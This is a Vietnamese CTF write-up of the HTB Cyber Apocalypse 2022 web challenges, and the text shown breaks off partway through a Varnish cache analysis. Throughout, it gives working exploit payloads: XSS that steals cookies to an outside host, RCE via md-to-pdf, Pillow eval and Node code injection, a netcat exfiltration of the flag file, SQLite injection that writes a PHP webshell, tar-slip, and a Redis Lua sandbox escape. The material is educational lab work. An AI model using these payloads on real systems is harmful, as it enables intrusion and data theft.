---
title: Cyber Apocalypse CTF 2022 - Writeup
tags: CTF
---
# HTB Cyber Apocalypse CTF 2022 - Web Writeup
## Kryptos Support
Dạo 1 vòng của trang thì nhận thấy như sau:
- Có 1 form report ở trang chủ, sau khi đưa input bất kì thì sẽ nhận được thông báo `An admin will review your ticket shortly!`.
=> Có thể đoán được là khi submit form với nội dung mình nhập vào thì bot sẽ truy cập vào và xem xét nội dung mình gửi lên.
- Tại trang đăng nhập, nếu đăng nhập thành công thì sẽ redirect tới `/tickets`. Thử với một vài query kiểm tra SQL Injection thì không thấy dump ra lỗi hay đăng nhập được nên tạm thời bỏ qua.

Nội dung hàm `auth` trong file `/static/js/login.js`:
```
async function auth() {
    await fetch(`/api/login`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    .then((response) => response.json()
        .then((resp) => {
            if (response.status == 200) {
                card.text(resp.message);
                card.show();
                window.location.href = '/tickets';
                return;
            }
            card.text(resp.message);
            card.show();
        }))
    .catch((error) => {
        card.text(error);
        card.show();
    });
}
```
Tới đây thì có thể suy nghĩ rằng phải có được account hoặc có thể lấy được cookie của bot để đăng nhập.
Quay lại form report, mình thử nhập mã HTML có chứa thẻ `script` để chạy mã Javascript nhằm lấy được cookie của bot để đăng nhập và có thể truy cập được vào `/tickets`.
```
<script>fetch('http://zndnjde4.requestrepo.com');</script>
```
Sau khi gửi payload thì chúng ta thấy là đã nhận được request tới của bot.

![Request của bot gửi tới host của mình](https://i.imgur.com/RUIxcs9.png)

Vậy thì giờ steal cookie bằng payload này:
```
<script>fetch('http://zndnjde4.requestrepo.com?a='+document.cookie);</script>
```

![Bot request tới host của mình kèm theo cookie của bot](https://i.imgur.com/P9aXt2a.png)

Cookie của bot:
```
session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI5NTIyMTR9.h8Pb0TkEZuxhfuLEBuW_EdQH4v27CyKuuH6xkPaDhTk
```
Sử dụng cookie này để truy cập vô `/tickets` nhận thấy cookie này không phải của `admin` và cũng không thấy `flag` chỉ biết thêm được 2 trang mới là: `/settings` và `/logout`.

![Hai rote mới là /settings và /logout](https://i.imgur.com/7bsyXDl.png)

Trang Setting có chức năng reset password, cụ thể xem tại file `settings.js`:
```
await fetch(`/api/users/update`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({password: password1, uid}),
})
```
Trang sẽ request vào endpoint `/api/users/update` với 2 tham số: `password` và `uid`.

![Request tại endpoint đổi password](https://i.imgur.com/l4L1wVE.png)

Kiểm tra request history trong Burp Suite thấy được `uid` là `100`.
=> `uid` là 100 không phải là của admin. Tới đây thì đoán rằng account `admin` có `uid` là `1`.
Thay giá trị `uid` thành `1` và đăng nhập admin với new password đã change thì đăng nhập thành công và nhận được flag.

### Tóm lại
- XSS ở form report `/api/tickets/add` để steal cookie.
- Ở `/api/users/update` xảy ra lỗ hổng IDOR => có thể thay đổi password của user khác, cụ thể hơn là `admin`.
- Đăng nhập `admin` với password reset => lấy flag.

![Flag hiện ra sau khi truy cập được vào tài khoản admin](https://i.imgur.com/ViIgnVu.png)

**Flag**: `HTB{x55_4nd_id0rs_ar3_fun!!}`

## BlinkerFluids
Truy cập bài thì thấy được một số chức năng chính:
- Tạo 1 invoice
- Export invoice thành file PDF
- Xóa invoice đã tạo

Cấu trúc source code được cung cấp:

![Cấu trúc source code được cung cấp](https://i.imgur.com/f9tMsbB.png)

Chức năng của các API endpoint:
- `/api/invoice/list` -> list ra các danh sách invoice đã tạo (gọi hàm `listInvoices` trong `databases.js`).
- `/api/invoice/add` -> thêm 1 invoice (hàm `addInvoice` trong `databases.js`).
- `/api/invoice/delete` -> xóa invoice đã tạo (hàm `deleteInvoice` trong `databases.js`).

Tất cả các hàm truy vấn trên đều sử dụng prepared statment nên không thể SQL Injection. Ở đây ta chỉ tập trung vô route `/api/invoice/add`.
```
router.post('/api/invoice/add', async (req, res) => {
    const { markdown_content } = req.body;

    if (markdown_content) {
        return MDHelper.makePDF(markdown_content)
            .then(id => {
                db.addInvoice(id)
                .then(() => {
                    res.send(response('Invoice saved successfully!'));
                })
                .catch(e => {
                    res.send(response('Something went wrong!'));
                })
            })
            .catch(e => {
                console.log(e);
                return res.status(500).send(response('Something went wrong!'));
            })
    }
    return res.status(401).send(response('Missing required parameters!'));
});
```
Nhận input từ người dùng thông qua paramater `markdown_content` sau đó đưa vô hàm `MDHelper.makePDF()` trong file `/helpers/MDHelper.js`.
```
const { mdToPdf }    = require('md-to-pdf')
const { v4: uuidv4 } = require('uuid')

const makePDF = async (markdown) => {
    return new Promise(async (resolve, reject) => {
        id = uuidv4();
        try {
            await mdToPdf(
                { content: markdown },
                {
                    dest: `static/invoices/${id}.pdf`,
                    launch_options: { args: ['--no-sandbox', '--js-flags=--noexpose_wasm,--jitless'] } 
                }
            );
            resolve(id);
        } catch (e) {
            reject(e);
        }
    });
}
```
- File này require thư viện `md-to-pdf` để xử lí input.
- Nhìn chung source code được cung cấp thì chỉ thấy chỗ import thư viện `md-to-pdf` có nghi ngờ còn những đoạn khác thì an toàn.
- Dockerfile cho biết được `flag.txt` nằm ở thư mục root => cần RCE để đọc file.

Vậy giờ chỉ còn điểm đáng nghi là thư viện `md-to-pdf` được sử dụng để xử lí input của người dùng đưa vào. Kiểm tra version của lib này trong file `package.json` là `4.1.0`.
Tìm trên Google version của lib thì thấy được [CVE-2021-23639](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880) có thể sử dụng để khai thác trong bài này. 

### Exploit
Ghi nội dung của flag.txt vô file `/app/static/flag.txt`
```
POST /api/invoice/add HTTP/1.1
Host: 46.101.30.188:32038
Content-Length: 119
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://46.101.30.188:32038
Referer: http://46.101.30.188:32038/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"markdown_content":"---js\n((require('child_process')).execSync('cat /flag.txt > /app/static/flag.txt'))\n---RCE"}
```
Truy cập `/static/flag.txt` để lấy flag.

**Flag**: `HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}`

## Amidst Us
Ở trang chủ của bài không có gì đặc biệt và chỉ có chức năng chỉnh màu cơ bản.

- Đọc source thì thấy chương trình chỉ xử lí hình ảnh, chỉnh màu sắc... bằng bằng thư viện `Pillow`.
- Chỉ có 1 điểm nghi ngờ ở trong file `util.py` là hàm `ImageMath.eval`. Thường thì hàm `eval` sẽ cho phép thực thi code và cụ thể hơn là hàm này nằm trong lib `Pillow==8.4.0`.
- Tìm Google với version đang sử dụng thì thấy được 1 CVE có liên quan [CVE-2022-22817](https://github.com/advisories/GHSA-8vj2-vxx3-667w).

### Payload
Trên server chạy command:
```
nc -lvnp [PORT]
```
Trigger command gửi flag:
```
{"image":"REDACTED","background":["__import__('os').system('cat /flag.txt | nc [IP] [PORT]')",15,15]}
```
**Flag**: `HTB{i_slept_my_way_to_rce}`

## Intergalactic Post
Trang chủ sau khi nhập email thì reponse chỉ trả về `Email subscribed successfully!`
Trong source code được cung cấp, chức năng này sẽ hoạt động như sau:
- File `index.php` có 2 routes: `/` và `/subscribe`.

Ở đây chỉ cần chú ý tới `/subscribe` vì nó là chức năng chính.
- Route này sẽ gọi đến function `store` trong controller `SubsController`.
- Function `store` này làm nhiệm vụ kiểm ra `email` nhập vào bằng hàm `filter_var()` với tham số filter là `FILTER_VALIDATE_EMAIL`.
- Pass được filter thì tiếp tục đưa vô function `subscribe` trong model `SubscriberModel`.
- Hàm `subscribe` nhận tham số `$email` và khởi tạo thêm 1 biến `$ip_address`, sau đó đưa `$email` và `$ip_address` vào hàm `subscribeUser` nằm trong file `Database.php`.
    - `$ip_address` được gán bằng giá trị trả về của function `getSubscriberIP`. Hàm này sẽ nhận các giá trị của một trong các headers: `X-Forwarded-For`, `Client-Ip` hoặc ip hiện tại mình đang request.
- Hàm `subscribeUser` trong file `Database.php` sẽ thực hiện insert 2 giá trị `ip_address` và `email` vào table `subscribers`. Ở đây 2 input này mình đều control được nhưng lại được đưa vô thẳng câu query => có thể SQL Injection.

Dockerfile cho biết flag ở thư mục root chứ không phải trong database => cần RCE để đọc flag.
Hàm `exec` trong SQLite3 có hỗ trợ multiple query => lợi dụng điều này để thực hiện SQLi to RCE.

### Exploit
```
POST /subscribe HTTP/1.1
Host: 46.101.30.188:31220
Content-Length: 21
X-Forwarded-For: 123','3'); ATTACH DATABASE '/www/shell.php' AS lol; DROP TABLE IF EXISTS lol.pwn; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET[0]); ?>");--
Connection: close

email=abc@gmail.com
```
Truy cập vào webshell vừa ghi: `/shell.php?0=cat+/flag*`

**Flag**: `HTB{inj3ct3d_th3_tru7h}`

## Mutation Lab
Các chức năng chính fuzz được trên trang là:
- `/api/login`, `/api/register` -> thử một số payload SQL Injection cơ bản nhưng không khả thi.
- `/api/export` nhận input của người dùng là 1 file SVG từ tham số `svg` sau đó sẽ export ra 1 file png tương ứng.

Khi thay đổi nội dung của tham số `svg` không phải là nội dung của file svg thì sẽ reponse trả về exception kèm stack trace.

![Stack trace của website](https://i.imgur.com/BS0272a.png)

- Biết được chương trình sử dụng thư viện `convert-svg-core` để xử lí file svg nhận từ người dùng.
- Tìm kiếm trên Google thì biết được rằng thư viện này đã từng có lỗi `Directory Traversal` với mã CVE là [CVE-2021-23631](https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-1582785).
- Có header `X-Powered-By: Express` trong response => website được viết bằng Nodejs.

Thử chạy payload của CVE trên và sau đó truy cập vô đường dẫn mà file pdf đã export ra thì nhận được nội dung của file `/etc/passwd`.

![Nội dung file /etc/passwd](https://i.imgur.com/c7skaJf.png)

Sử dụng CVE trên để đọc source để biết flag nằm ở đâu và làm như thế nào để lấy flag.

Tiến hành đọc các file như: `/app/index.js`, `/app/database.js` và `/app/routes/index.js`

###### index.js
![Nội dung file index.js](https://i.imgur.com/81ozlhv.png)

- Biết được `key` để tạo cookie của `session` nằm ở `process.env.SESSION_SECRET_KEY` => có thể đọc được `SESSION_SECRET_KEY` này bằng cách tương tự như đã đọc file `index.js`
- Khi lấy được `SESSION_SECRET_KEY` thì có thể craft lại session theo ý mình muốn

Đoạn code trong file `routes/index.js` cho biết được sẽ nhận được flag khi đăng nhập với account `admin`.

![Điều kiện để in ra flag](https://i.imgur.com/OHUHqsV.png)

### Tóm lại
Để có thể giải quyết bài này thì sẽ làm như sau:
- Đọc file `/app/.env` để lấy được `SESSION_SECRET_KEY`
- Craft lại session của admin sau đó truy cập vô `/dashboard` để lấy flag

### Exploit steps
- Đọc file `.env` để lấy `SESSION_SECRET_KEY`
```
{"svg":"<svg-dummy></svg-dummy><iframe src='file:///app/.env' width='100%' height='1000px'></iframe><svg viewBox='0 0 240 80' height='1000' width='1000' xmlns='http://www.w3.org/2000/svg'><text x='0' y='0' class='Rrrrr' id='demo'>data</text></svg>"}
```
**SESSION_SECRET_KEY**: `5921719c3037662e94250307ec5ed1db`

Craft lại session với `username` là `admin`:
```
const express = require('express')
const app = express()
const session = require("cookie-session")

app.use(session({
    name: 'session',
    keys: ['5921719c3037662e94250307ec5ed1db']
}))

app.get('/', (req, res) => {
    req.session.username = "admin"
    res.send("hello")
})

app.listen(8081)
```
- Host file này sau đó truy cập `http://[YOUR_VPS]:8081/` để lấy `session` và `session_sig`.

![Craft được session và session_sig của admin](https://i.imgur.com/i9JpsfG.png)

- Truy cập vào `/dashboard` với session admin đã craft được.

![Truy cập vào trang dashboard để lấy flag](https://i.imgur.com/u9FHleO.png)

**Flag**: `HTB{fr4m3d_th3_s3cr37s_f0rg3d_th3_entrY}`

## Acnologia Portal
Các tính năng có thể nhìn thấy khi truy cập challenge: login, register. Sau khi đăng nhập thì thấy rằng website sẽ liệt kê danh sách các firmware và từng module kèm theo chức năng report với tham số `issue`.

Tập trung đến những đoạn code sau sẽ dẫn đến lỗi để có thể exploit bài này:
```
@api.route('/firmware/report', methods=['POST'])
@login_required
def report_issue():
    if not request.is_json:
        return response('Missing required parameters!'), 401

    data = request.get_json()
    module_id = data.get('module_id', '')
    issue = data.get('issue', '')

    if not module_id or not issue:
        return response('Missing required parameters!'), 401

    new_report = Report(module_id=module_id, issue=issue, reported_by=current_user.username)
    db.session.add(new_report)
    db.session.commit()

    visit_report()
    migrate_db()

    return response('Issue reported successfully!')
```
- Có chức năng report và 2 tham số do người dùng nhập vào có thể control được là `module_id` và `issue`. 
- Gọi đến hàm `visit_report` nằm trong file `bot.py`. Hàm này sẽ tự động đăng nhập tài khoản admin với username và password lấy từ file `config.py`. Sau đó sẽ truy cập tới `http://localhost:1337/review`.
    ```
    @web.route('/review', methods=['GET'])
    @login_required
    @is_admin
    def review_report():
        Reports = Report.query.all()
        return render_template('review.html', reports=Reports)
    ```
    - Route này yêu cầu chỉ admin mới có quyền truy cập.
    - Decorator `@is_admin` chỉ kiểm tra `current_user.username == current_app.config['ADMIN_USERNAME'] and request.remote_addr == '127.0.0.1'` và với yêu cầu của bot thì đều pass được cả 2 điều kiện này.
    - Sau đó query với các column `id`, `module_id`, `reported_by`, `issue` và lấy tất cả dữ liệu trả về render cho template `review.html`.
    - Trong file `review.html` in ra `module_id` và `issue` => có thể XSS ở đây.
    - Mặc dù control được cả `module_id` và `issue` nhưng trong database chỉ cho phép `issue` là text, còn `module_id` là integer => XSS ở `issue`.
- Gọi đến hàm `migrate_db` - hàm này có nhiệm vụ sau khi kết thúc report thì sẽ xóa sạch các dữ liệu nằm trong table, sau đó insert account admin và 1 số thông tin của firmware.
```
@api.route('/firmware/upload', methods=['POST'])
@login_required
@is_admin
def firmware_update():
    if 'file' not in request.files:
        return response('Missing required parameters!'), 401

    extraction = extract_firmware(request.files['file'])
    if extraction:
        return response('Firmware update initialized successfully.')

    return response('Something went wrong, please try again!'), 403
```
- Sử dụng decorator `@is_admin` để giới hạn quyền truy cập.
- Sau khi upload 1 file thông qua tham số `file` thì sẽ được đưa vô hàm `extract_firmware` trong file `until.py`.
```
def extract_firmware(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, file.filename)
    file.save(path) 

    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, 'r:gz')
        tar.extractall(tmp)

        rand_dir = generate(15)
        extractdir = f"{current_app.config['UPLOAD_FOLDER']}/{rand_dir}"
        os.makedirs(extractdir, exist_ok=True)
        for tarinfo in tar:
            name = tarinfo.name
            if tarinfo.isreg():
                try:
                    filename = f'{extractdir}/{name}'
                    os.rename(os.path.join(tmp, name), filename)
                    continue
                except:
                    pass
            os.makedirs(f'{extractdir}/{name}', exist_ok=True)
        tar.close()
        return True
```
- File upload lên sẽ được lưu tại thư mục `/tmp`.
- Check file vừa tải lên có phải định dạng tar hay không, sau đó sử dụng hàm `extractall` để extract ra thư mục `/tmp`.
- Các file được extract sẽ được nằm trong `{current_app.config['UPLOAD_FOLDER']}/{rand_dir}` cụ thể là `/app/application/static/firmware_extract/[rand_dir]`
- Sau khi extract thành công thì cũng không truy cập được những file mình đã extract đó vì có thêm thư mục với tên ngẫu nhiên.
- Nhưng hàm `extractall` sẽ gây ra lỗi path traversal khi extract nếu không check `..` trong filename (tham khảo: [py-tarslip](https://codeql.github.com/codeql-query-help/python/py-tarslip/)) => arbitrary file write.

### Tóm lại
Chúng ta có thể biết được chương trình này chứa 2 lỗi XSS và Path Traversal.

Ý tưởng giải quyết:
- Sử dụng XSS để upload file tar qua `/firmware/upload` vì route này chỉ có admin truy cập được.
- Tạo 1 file `flag.txt` và symlink trỏ tới `/flag.txt`.
- Nén file đã tạo vào trong file tar và tiến hành sửa filename từ `flag.txt` thành`../../../../../app/app/application/static/firmware_extract/flag.txt` để ghi vào chỗ mà mình có thể truy cập được.

### Exploit steps
- Symlink `/flag.txt`
```
touch flag.txt
ln -s /flag.txt flag.txt
```
- Nén file thành tar
```
tar cvzf payload.tar.gz flag.txt
```
- Sử dụng 7z để sửa filename flag.txt thành `../../../../../app/app/application/static/firmware_extract/flag.txt`
- Host 1 file `index.php` trên VPS và lưu file `payload.tar.gz` cùng thư mục với nhau. Chạy command `php -S 0.0.0.0:1234`
```
<?php
header("Access-Control-Allow-Origin: *");
echo file_get_contents("payload.tar.gz");
?>
```
- Script để upload file ở `issue`:
```
<script>
fetch('http://[YOUR_VPS]:1234/')
.then(res => res.blob())
.then(content => {
    let data = new FormData()
    data.append('file', content)
    fetch("/api/firmware/upload", {
        method: "POST",
        body: data
    })
    .then(r => r.text())
    .then(t => fetch("https://[YOUR_REQUESTBIN]?a=" + t))
})
</script>
```
- Cuối cùng truy cập vào `/static/firmware_extract/flag.txt` để lấy flag.

**Flag**: `HTB{des3r1aliz3_4ll_th3_th1ngs}`

## Red Island
Không được cung cấp source nên fuzz thì thấy có một số chức năng sau:
- `/api/login` và `/api/register` -> thử một số payload đơn giản về SQL Injection thì bài này vẫn không work.
- `/api/red/generate` -> nhận giá trị của người dùng nhập vào thông qua tham số `url`.

Vì thử payload ở login và register đều không thể thực hiện SQL Injection nên bây giờ chỉ focus vào `/api/red/generate`.
- Thử nhập url `http://google.com` thì có trả về reponse là nội dung của trang.
- Vậy ở đây có thể nghĩ tới lỗi SSRF => thử payload `file:///etc/passwd`

![Đọc file /etc/passwd](https://i.imgur.com/pngPZWl.png)

- Đọc thành công nội dung file `/etc/passwd` => Sử dụng lỗi SSRF để khai thác bài này.
- Có header `X-Powered-By: Express` trong response => website được viết bằng Nodejs.
- Vậy bây giờ sử dụng lỗ hổng SSRF để đọc source nhằm biết flag ở đâu và chương trình có thêm một số chức năng ẩn nào khác không.

Sử dụng cái payload sau để đọc source code của bài:
```
file:///app/index.js
file:///app/database.js
file:///app/routes/index.js
file:///app/middleware/AuthMiddleware.js
file:///app/helpers/createRed.js
file:///app/helpers/ImageDownloader.js
```
Sau khi đọc được source thì không thấy flag nằm trong database => cần phải RCE để tìm flag ở đâu và đọc nó.
File `index.js` cho biết chương trình sử dụng Redis => port 6379 đang mở.
- Sử dụng tool [Gopherus](https://github.com/tarunkant/Gopherus) để tạo payload nhưng không thành công.
- Sau khi tìm kiếm trên Google thì thấy được có [CVE-2022-0543](https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543) có thể RCE bằng cách escape Lua sandbox.

### Payload
```
{"url":"gopher://localhost:6379/_eval%20%22local%20io_l=package.loadlib(%27/usr/lib/x86_64-linux-gnu/liblua5.1.so.0%27,%27luaopen_io%27);local%20io=io_l();local%20f%20=%20io.popen(%27ls%20/app%27,%27r%27);local%20res=f:read(%27*a%27);return%20res%22%200%0aquit"}
```
**Flag**: `HTB{r3d_righ7_h4nd_t0_th3_r3dis_land!}`

## Spiky Tamagotchy
Đọc source thì chỉ nhận thấy được đoạn code dưới đây là xử lí chính:
```
router.post('/api/activity', AuthMiddleware, async (req, res) => {
    const { activity, health, weight, happiness } = req.body;
    if (activity && health && weight && happiness) {
        return SpikyFactor.calculate(activity, parseInt(health), parseInt(weight), parseInt(happiness))
            .then(status => {
                return res.json(status);
            })
            .catch(e => {
                res.send(response('Something went wrong!'));
            });
    }
    return res.send(response('Missing required parameters!'));
});
```
- Nhận 4 giá trị từ các tham số `activity`, `health`, `weight`, `happiness`.
- Các giá trị của các tham số trên sẽ được ép kiểu thành integer, chỉ trừ `activity` vẫn giữ là string.
- Sau đó đưa các giá trị này vô hàm `calculate` ở file `SpikyFactor.js`
```
const calculate = (activity, health, weight, happiness) => {
    return new Promise(async (resolve, reject) => {
        try {
            // devine formula :100:
            let res = `with(a='${activity}', hp=${health}, w=${weight}, hs=${happiness}) {
                if (a == 'feed') { hp += 1; w += 5; hs += 3; } if (a == 'play') { w -= 5; hp += 2; hs += 3; } if (a == 'sleep') { hp += 2; w += 3; hs += 3; } if ((a == 'feed' || a == 'sleep' ) && w > 70) { hp -= 10; hs -= 10; } else if ((a == 'feed' || a == 'sleep' ) && w < 40) { hp += 10; hs += 5; } else if (a == 'play' && w < 40) { hp -= 10; hs -= 10; } else if ( hs > 70 && (hp < 40 || w < 30)) { hs -= 10; }  if ( hs > 70 ) { m = 'kissy' } else if ( hs < 40 ) { m = 'cry' } else { m = 'awkward'; } if ( hs > 100) { hs = 100; } if ( hs < 5) { hs = 5; } if ( hp < 5) { hp = 5; } if ( hp > 100) { hp = 100; }  if (w < 10) { w = 10 } return {m, hp, w, hs}
                }`;
            quickMaths = new Function(res);
            const {m, hp, w, hs} = quickMaths();
            resolve({mood: m, health: hp, weight: w, happiness: hs})
        }
        catch (e) {
            reject(e);
        }
    });
}
```
Đoạn code này sẽ xảy ra lỗi Code Injection vì input của người dùng đưa thẳng vào đoạn code js và tạo function từ đoạn string đó, cuối cùng gọi lại hàm đã khởi tạo.

Nhưng để exploit được chỗ này thì phải pass được `AuthMiddleware` được gọi khi request tới `/api/activity`.
```
const JWTHelper = require('../helpers/JWTHelper');

module.exports = async (req, res, next) => {
	try{
		if (req.cookies.session === undefined) {
			if(!req.is('application/json')) return res.redirect('/');
			return res.status(401).json({ status: 'unauthorized', message: 'Authentication required!' });
		}
		return JWTHelper.verify(req.cookies.session)
			.then(username => {
				req.data = username;
				next();
			})
			.catch(() => {
				res.redirect('/logout');
			});
	} catch(e) {
		console.log(e);
		return res.redirect('/logout');
	}
}
```
- Ở đây check session đưa vào phải được xác thực, có nghĩa là phải login vô với account bất kì không cần phải là admin.
- Nhưng trong source không có chỗ login và những query đều là prepared statement nên hiện tại không thể thực hiện SQL Injection.

Dockerfile cho biết flag được nằm ở thư mục root => cần RCE để đọc flag. Điều kiện này có thể thực hiện được vì đã có lỗi Code Injection.

Chú ý thì thấy được MySQL được sử dụng, vậy nhớ đến 1 bài viết có phân tích về một lỗ hổng SQL Injection về prepared statement, lỗ hổng này chỉ tồn tại trong MySQL NodeJS. Tham khảo [mysqljs](https://maxwelldulin.com/BlogPost?post=9185867776)

### Tóm lại
- Sử dụng SQL Injection trong thư viện MySQl của NodeJS để thực hiện bypass việc login.
- Escape và injection 1 đoạn code trong tham số `activity` để RCE.

### Exploit
Bypass login
```
POST /api/login HTTP/1.1
Host: localhost:1337
Content-Length: 46
Content-Type: application/json
Connection: close

{"username":"admin","password":{"password":1}}
```
Code Injection
```
POST /api/activity HTTP/1.1
Host: localhost:1337
Content-Length: 156
Content-Type: application/json
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjUzMTI1MDUzfQ.eVI31ZS4G_sKykUMsjGXNGi8HIQBq_sORrIg0RsyntA
Connection: close

{"activity":"'+process.mainModule.require('child_process').execSync('cat /flag.txt > /app/static/flag.txt')+'","health":"60","weight":"42","happiness":"50"}
```
Truy cập `/static/flag.txt` để đọc flag.

**Flag**: `HTB{3sc4p3d_bec0z_n0_typ3_ch3ck5}`

## Genesis Wallet & Genesis Wallet's Revenge
Chúng ta cùng nhìn qua `Dockerfile` để có thể hình dung được bài này được setup như thế nào và sử dụng thư viện, service gì.

![Dockerfile](https://i.imgur.com/0JfirL0.png)

- Cài đặt trình duyệt Google Chrome.
- Cài đặt Varnish.
- Nội dung file `/etc/varnish/secret` được lấy ngẫu nhiên từ file `/dev/urandom`.
- Copy các file config vào đúng vị trí để các service sử dụng.

### Varnish là gì?
Varnish là một "web application accelerator" đóng vai trò là một reverse proxy làm nhiệm vụ caching các HTTP requests nhằm tăng tốc độ truyền tải dữ liệu từ server đến client nhanh chóng hơn.

### Genesis Wallet - Unintended solution
Các đoạn code dưới đây dẫn đến lỗi ở bài này:
File `routes/index.js`
```
router.post('/api/transactions/create', AuthMiddleware, async (req, res) => {
    const {amount, receiver, note} = req.body;
    if (trxLocked) return res.status(401).send(response('Please wait for the previous transaction to process first!'));

    return db.getUser(req.user.username)
        .then(user => {
            if (parseFloat(user.balance) < parseFloat(amount)) return res.status(403).send(response('Insufficient Funds!'));
            if (!addressExp.test(receiver)) return res.status(403).send(response('Invalid receiver address format!'));
            if (receiver == user.address) return res.status(403).send(response(`You can't send to your own address!`));
            trxLocked = true;

            safeNote = MDHelper.filterHTML(note);
            db.addTransaction(user.address, receiver, user.balance, amount, safeNote)
                .then(() => {
                    trxLocked = false;
                    return res.send(response('Transaction created successfully!'));
                })
                .catch(e => {
                    trxLocked = false;
                    console.log(e);
                    return res.status(500).send(response('Something went wrong, please try again!'))
                })
        })
        .catch((e) => {
            console.log(e);
            trxLocked = false;
            res.status(500).send(response('Internal server error!'));
        });
});
```
- Nhận giá trị từ người dùng qua 3 tham số `amount`, `receiver`, `note`.
- Check `balance` không được nhỏ hơn `amount`, `address` không được là chính address của user chuyển tiền. 
- Giá trị mà người dùng truyền vô tham số `note` thì sẽ được xử lí qua hàm `filterHTML` ở file `MDHelper.js`. Cụ thể là sử dụng lib `dompurify`.
- Hàm `addTransaction` trong `database.js` sẽ nhận 4 giá trị `user.address` (address của người gửi), `receiver` (address của người nhận), `balance` (balance của người gửi), `amount`(số tiền chuyển), `safeNote` (giá trị của tham số `note` sau qua hàm `filterHTML` xử lí).
- Đoạn code này chỉ có chức năng là tạo 1 transaction để chuyển tiền nhưng chưa được xác thực (ở trang thái pending).

Để xác thực thì gọi đến route `/api/transactions/verify`:
- Check OTP thành công thì sẽ gọi đến hàm `verifyTransaction` trong `database.js`.
- Hàm `verifyTransaction` có nhiệm vụ trừ `balance` trong account người gửi và cộng thêm `balance` cho người nhận.

![Điều kiện để in ra flag](https://i.imgur.com/JjMDTjC.png)

- Khi `balance` của account lớn hơn 1337 và username khác `icarus` thì sẽ nhận được flag.

Về address của người nhận là giá trị hash md5 của username, ở trong file `database.js` thấy được có 1 username được insert sẵn, address là `1ea8b3ac0640e44c27b3cb8a258a87f8`.

Chú ý thì thấy ở đây khi `amount` được nhập từ người dùng thì sẽ không check số âm. Vậy nếu chúng ta nhập số âm thì chuyện gì sẽ xảy ra?
- Khi update balance của người chuyển sẽ lấy `balance` hiện tại mà username có trừ đi `amount`.
=> Nếu nhập `amount` là -1 thì phép toán thực hiện sẽ là `balance - -1` sẽ khiến `balance` của account tăng lên chứ không bị giảm đi.

### Payload
```
POST /api/transactions/create HTTP/1.1
Host: localhost:1337
Content-Type: application/x-www-form-urlencoded
Cookie: session=REDACTED
Content-Length: 64

amount=-99999&receiver=1ea8b3ac0640e44c27b3cb8a258a87f8&note=abc
```
**Flag**: `HTB{fl3w_t00_cl0s3_t0_th3_d3cept10n}`

### Genesis Wallet's Revenge - Intended solution
Chúng ta cùng kiểm tra từng phần nhỏ của file `cache.vcl` dùng làm file config để hiểu kĩ hơn.
#### cache.vcl
```
vcl 4.1;
```
Mỗi file có đuôi .vcl đều phải bắt đầu bằng việc khai báo version của cú pháp Varnish sẽ sử dụng, ở đây là `4.1`.

```
backend default {
    .host = "127.0.0.1";
    .port = "1337";
}
```
Khai báo thông tin của backend server, ở đây là service Nodejs đang chạy tại địa chỉ `127.0.0.1` với port là `1337`.
```
sub vcl_hash {
    hash_data(req.url);

    if (req.http.host) {
        hash_data(req.http.host);
    } else {
        hash_data(server.ip);
    }

    return (lookup);
}
```
Subroutine `vcl_hash` chỉ định input nào sẽ đóng vai trò làm cache index để so sánh và trả về dữ liệu đã cache trước đó. Cụ thể thì Varnish sẽ dựa vào `req.url`, `req.http.host` (`Host` header) và `server.ip` làm cache index. Đây cũng là cấu hình mặc định của Varnish.
```
sub vcl_recv {
    # Only allow caching for GET and HEAD requests
    if (req.method != "GET" && req.method != "HEAD") {
        return (pass);
    }
    # get javascript and css from cache
    if (req.url ~ "(\.(js|css|map)$|\.(js|css)\?version|\.(js|css)\?t)") {
        return (hash);
    }
    # get images from cache
    if (req.url ~ "\.(svg|ico|jpg|jpeg|gif|png)$") {
        return (hash);
    }
    # get fonts from cache
    if (req.url ~ "\.(otf|ttf|woff|woff2)$") {
        return (hash);
    }
    # get everything else from backend
    return(pass);
}
```
Đây là subroutine sẽ được Varnish chạy đầu tiên. Tại subroutine này trả về 2 actions: `pass` và `hash`.
- `pass`: Bỏ qua bước tìm kiếm cache index để trả về dữ liệu, nhưng vẫn thực hiện tiếp các flow còn lại của Varnish. `pass` không thực hiện caching response.
- `hash`: Thực hiện tìm kiếm cache index để trả về dữ liệu đã cached (hoặc caching những response chưa được cached).

Dựa vào khái niệm của 2 actions trên, chúng ta cũng có thể suy ra được subroutine này đang thực hiện nhiệm vụ gì.
- Nếu HTTP method không phải là `GET` và `HEAD` thì bỏ qua việc tìm kiếm cached data.
- Nếu `req.url` thỏa mãn câu regex `(\.(js|css|map)$|\.(js|css)\?version|\.(js|css)\?t)` thì sẽ caching response.
    - `\.(js|css|map)$`: kiểm tra những kí tự cuối của `req.url` có chứa `.js`, `.css` hay `.map` hay không.
    - `\.(js|css)\?version`: có `.js?version` hay `.css?version` trong request url hay không.
    - `\.(js|css)\?t`: có `.js?t` hay `.css?t` trong request url hay không.
- Hai đoạn `if` còn lại cũng tương tự.
- Cuối cùng là sẽ không thực hiện caching response nếu không thỏa các điều kiện trên.
```
sub vcl_backend_response {
    set beresp.ttl = 120s;
}
```
Subroutine này sẽ được execute nếu backend server trả về response với HTTP status codes không phải là một error status codes.
Trong config này thì sẽ set thời gian TTL (Time-To-Live) của cached data là 120s.
```
sub vcl_deliver {
    if (obj.hits > 0) {
        set resp.http.X-Cache = "HIT";
    } else {
